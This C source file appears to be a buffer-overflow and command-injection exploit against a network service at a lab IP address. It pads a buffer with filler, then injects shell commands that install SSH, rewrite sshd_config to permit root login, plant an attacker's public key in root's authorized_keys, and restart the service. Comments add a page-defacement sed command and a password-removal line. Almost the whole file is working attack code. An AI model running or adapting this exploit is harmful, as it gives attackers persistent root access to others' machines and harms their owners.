#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 512
#define IP "192.168.56.101"
#define PORT 1234
#define SSH "PUBLIC SSH KEY"
/*
I learned about the buffer overflow from https://www.thegeekstuff.com/2013/06/buffer-overflow/ 
*/
    /*
    commands : 
    sed -i 's/<\\/body>/<p>Name<\\/p>\\n<\\/body>/'  to add Name to the body +  /var/www/html/index.html; #
    sed -i '/name/d'       to remove the name from the body

    */
int execute_command(char* command){
    int sockfd=-1;
    struct sockaddr_in server_addr;
    char buffer[1024];
    socklen_t server_len = sizeof(server_addr);
    char *Buffer=calloc(BUFFER_SIZE, 1);
    memset(Buffer,'a',117);

    strncat(Buffer,command,512 - strlen(Buffer) - 1);
    memset(&server_addr, 0, sizeof(server_addr));
    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port=htons(PORT);
    server_addr.sin_addr.s_addr=inet_addr(IP);

    if ((sockfd=socket(AF_INET,SOCK_STREAM,0))<0){
        perror("Socket creation failed");
        return 1;
    }
        if (connect(sockfd,(struct sockaddr *)&server_addr,sizeof(server_addr))<0){
        perror("connection failed");
        return 1;
    }
    // Sending the message to the server
    if (send(sockfd,Buffer,strlen(Buffer),0)<0){
        perror("send failed");
        return 1;
    }

    while (1){
            int bytes_received=recv(sockfd,buffer,1023,0);
            if(bytes_received<=0){
                break;
            }
            else{
                printf("%s\n",buffer);
            }
    }
    free(Buffer);
    printf("success\n");
    close(sockfd);

    return 0;
}

int configure_ssh(){
    char command[512];
    strncpy(command, ";apt-get update && apt-get install -y openssh-server #", sizeof(command));
    if (execute_command(";apt-get update && apt-get install -y openssh-server #") == 1) {
        printf("Failed to check/install SSH\n");
        return 1;
    }

    strncpy(command, "; rm -f /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command("; rm -f /etc/ssh/sshd_config #") == 1) {
        printf("Failed to start new config\n");
        return 1;
    }

    if (execute_command("; echo 'AddressFamily any' >> /etc/ssh/sshd_config #") == 1) {
        printf("Failed to start new config\n");
        return 1;
    }
    if (execute_command("; echo 'Port 22' >> /etc/ssh/sshd_config #") == 1) {
        printf("Failed to start new config\n");
        return 1;
    }
    if (execute_command("; echo 'Protocol 2' >> /etc/ssh/sshd_config #") == 1) {
        printf("Failed to start new config\n");
        return 1;
    }
    strncpy(command, "; echo 'HostKey /etc/ssh/ssh_host_rsa_key' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }
    strncpy(command, "; echo 'HostKey /etc/ssh/ssh_host_rsa_key' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }
    strncpy(command, "; echo 'HostKey /etc/ssh/ssh_host_ecdsa_key' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }
    strncpy(command, "; echo 'HostKey /etc/ssh/ssh_host_ed25519_key' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }
    strncpy(command, "; echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }      
    strncpy(command, "; echo 'PubkeyAuthentication yes' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }      
    strncpy(command, "; echo 'AuthorizedKeysFile /root/.ssh/authorized_keys' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }      
    strncpy(command, "; echo 'PasswordAuthentication no' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }
    strncpy(command, "; echo 'ChallengeResponseAuthentication no' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }   
    strncpy(command, "; echo 'UsePAM yes' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }   
    strncpy(command, "; echo 'GatewayPorts yes' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }   
    strncpy(command, "; echo 'X11Forwarding yes' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }   
    strncpy(command, "; echo 'PrintMotd no' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }   
    strncpy(command, "; echo 'AcceptEnv LANG LC_*' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }
    strncpy(command, "; echo 'Subsystem sftp /usr/lib/openssh/sftp-server' >> /etc/ssh/sshd_config #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to start new config\n");
        return 1;
    }                          

  
    strncpy(command, "; mkdir -p /root/.ssh #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to create .ssh directory\n");
        return 1;
    }

    strncpy(command, "; chmod 700 /root/.ssh  #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to set permissions\n");
        return 1;
    }

    strncpy(command, "; chmod 600 /root/.ssh/authorized_keys #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to set permissions\n");
        return 1;
    }
    return 0;
}
int insert_ssh(){
    if (configure_ssh()==1){
        printf("error configurating ssh");
        return 1;
    }
    char ssh_key[5000];
    strncpy(ssh_key,SSH,strlen(SSH));
    size_t len = strlen(ssh_key);
    if (len > 0 && ssh_key[len-1] == '\n') {
        ssh_key[len-1] = '\0';
        len--;
    }
    char command[512];
    memset(command,0,512);
    
    char *chunk = malloc(12);
    chunk[11]='\0';
    int tot = strlen(ssh_key)/10;
    tot++;
    for( int i=0; i<tot;i++){
        memset(command,'0',512);
        size_t start=i*10;
        memcpy(chunk,ssh_key+start,10);

        if (i == 0) {
            sprintf(command, "; echo -n '%s' >> /root/.ssh/authorized_keys; #", chunk);
        } else {
            sprintf(command, "; echo -n '%s' >> /root/.ssh/authorized_keys; #", chunk);
        }
        if (execute_command(command)==1){
        printf("send command failed");
        return 1;
    }
    }
    strncpy(command,"; echo '\\n' >> /root/.ssh/authorized_keys; #",sizeof(command));
    if (execute_command(command)==1){
        printf("send command failed");
        return 1;
    }
    // Restart SSH service
    strncpy(command, "; systemctl restart ssh || service ssh restart #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to restart SSH service\n");
        return 1;
    }
    
    // Enable SSH service to start on boot
    strncpy(command, "; systemctl enable ssh || update-rc.d ssh enable #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to enable SSH service\n");
        return 1;
    }
    
    // Verify SSH is running
    strncpy(command, "; ps aux | grep sshd | grep -v grep #", sizeof(command));
    if (execute_command(command) == 1) {
        printf("Failed to verify SSH is running\n");
        return 1;
    }
    
    printf("SSH key has been inserted\n");
    return 0;
}
/*
    char command[]="; sed -i \"s/<\\/body>/<p>baha<\\/p>\\n<\\/body>/\" /var/www/html/index.html; #";

*/
int main (int argc, char** argv){
/*char command[]=";sudo passwd -d user ;#";*/
if (configure_ssh()!=0){
    return 1;
}
if (insert_ssh()!= 0) return 1;
    return 0;
}
